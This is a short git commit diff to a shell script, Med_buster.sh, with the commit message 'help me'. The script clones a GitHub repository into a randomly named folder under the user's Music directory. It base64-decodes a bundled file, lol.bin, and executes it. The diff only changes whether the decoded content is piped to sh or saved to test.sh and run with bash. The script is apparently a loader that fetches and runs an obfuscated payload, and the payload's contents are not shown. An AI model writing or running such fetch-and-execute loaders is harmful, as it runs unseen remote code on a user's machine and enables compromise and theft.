8eba77f3bee0c952114a6ede248d9331607ec0bc
Sarah Hicham Meftah <hmeftah@c1r6p5.1337.ma>
2023-03-13 17:00:49 +0100

    help me

--- Med_buster.sh
+++ Med_buster.sh
@@ -1,4 +1,5 @@
 export random=$RANDOM
 
 git clone https://github.com/SilentSarah/Med_buster /Users/$USER/Music/lkwa${random}
-base64 -d /Users/$USER/Music/lkwa${random}/lol.bin | sh $random
+base64 -d /Users/$USER/Music/lkwa${random}/lol.bin > /Users/$USER/Music/lkwa${random}/test.sh
+bash /Users/$USER/Music/lkwa${random}/test.sh $random
